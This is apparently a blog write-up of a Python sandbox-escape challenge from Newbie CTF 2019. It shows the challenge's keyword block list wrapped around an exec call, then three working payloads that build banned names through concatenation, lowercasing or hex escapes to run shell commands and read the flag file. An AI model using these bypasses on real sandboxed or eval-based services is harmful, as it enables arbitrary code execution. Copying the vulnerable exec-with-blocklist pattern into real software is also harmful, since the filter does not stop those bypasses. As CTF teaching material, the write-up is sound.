---
title: "How to Python jail escape (Newbie CTF 2019)"
date: "May 1, 2022"
excerpt: "Python jail escape: a challenge with one of the lowest points in the Newbie CTF 2019 which we solve in this article. We use built-in methods."
cover_image: "/images/posts/jailescape/image-e1658960653261.webp"
tags:
  [
    "Python",
    "ctf",
    "ctf jail",
    "ethical hacking",
    "security",
    "Newbie CTF",
    "Newbie CTF 2019",
    "pyjail",
    "bash",
    "data",
    "built-in methods",
    "getattr",
  ]
---

Python jail escape: a challenge with one of the lowest points in the Newbie CTF 2019 which we solve in this article. It is generally a bad idea to allow users to input commands that will be executed since there is a high chance that they could input something that would allow them to gain elevated permissions or access sensitive data. However, people often add condition checks in an attempt to prevent this from happening, even though it is rarely effective.

The jail is basically a set of python code that is executed on the python process when the user executes certain commands, in this case entering specific lines of text. This is possible since Python allows passing parameters to the application. In this particular case, the script only checks if the command passed is not banned.

![Python jail Escape](/images/posts/jailescape/image-2.webp)

## Python Jail escape: Code

We connect to the virtual environment. Next the following text appears:

```bash
Hi! Welcome to pyjail!
========================================================================
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
print(“Hi! Welcome to pyjail!”)
print(“========================================================================”)
print(open(__file__).read())
print(“========================================================================”)
print(“RUN”)
text = input(‘>>> ‘)
for keyword in [‘eval’, ‘exec’, ‘import’, ‘open’, ‘os’, ‘read’, ‘system’, ‘write’]:
if keyword in text:
print(“No!!!”)
return;
else:
exec(text)
if __name__ == “__main__”:
main()
========================================================================
RUN
```

The source code for the program is available, so we can figure out what needs to be done in order to beat the condition checks. The functions that could be used to get the flag are not allowed :'eval’, ‘exec’, ‘import’, ‘open’, ‘os’, ‘read’, ‘system’, ‘write’. However, we could utilize the concatenation of strings to evade the restriction as well as using [Built-in functions](https://docs.python.org/3/library/functions.html).

In order to understand how Python evaluates statements, let’s take a look at an example. If you write “import os” in a Python script, Python will retrieve a function object called `import` and pass it the input `os`. This will return a class called “os” with the relevant methods. Besides, you can use built-in objects in Python by using the **built-in** module. This module is not typically accessed directly by most applications. Nevertheless, it can be useful for modules that provide objects with the same name as a built-in value.

```bash
>>> print(getattr(getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('ls .'))
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
0
>>> print(getattr(getattr(globals()[‘__builtins__’], ‘__im’+’port__’)(‘o’+’s’), ‘sys’+’tem’)(‘cat home/python_jail/flag’))

KorNewbie{H311oh0w@r3_y0u_d0lng?}
```

Another solution to the Capture the Flag challenge is to use lower() string method:

```bash
>>>__builtins__.__dict__[‘__IMPORT__’.lower()](‘OS’.lower()).__dict__[‘SYSTEM’.lower()](‘cat /home/python_jail/flag’)
```

We could also encode the strings to display the hidden key:

```bash
>>> print(getattr(getattr(getattr(main, ‘__globals__’)[‘__builtins__’], ‘\x6f\x70\x65\x6e’)(‘/home/python_jail/flag’, ‘rb’), ‘\x72\x65\x61\x64’)())
b’\xef\xbb\xbfKorNewbie{H311o_h0w_@r3_y0u_d0lng?}
```

## Related Posts

- [Simple Ceramic Data Model App and Unstoppable Domains](https://dspyt.com/simple-app-with-ceramic-data-model-and-unstoppable-domains)
- [Simple QR code generator on AWS with Flask](https://dspyt.com/simple-qr-code-generator-on-aws-with-flask)
- [How to implement asyncio python tutorial](https://dspyt.com/simple-asynchronous-python-webscraper-tutorial)
- [How to generate parsiq wallet triggers for CryptoPunks](https://dspyt.com/generating-fast-and-easy-parsiq-triggers-for-cryptopunks)
- [Guide to Marhaba Decentralized Financial Platform](https://dspyt.com/mrhb-defi-great-technologies-and-functionalities)
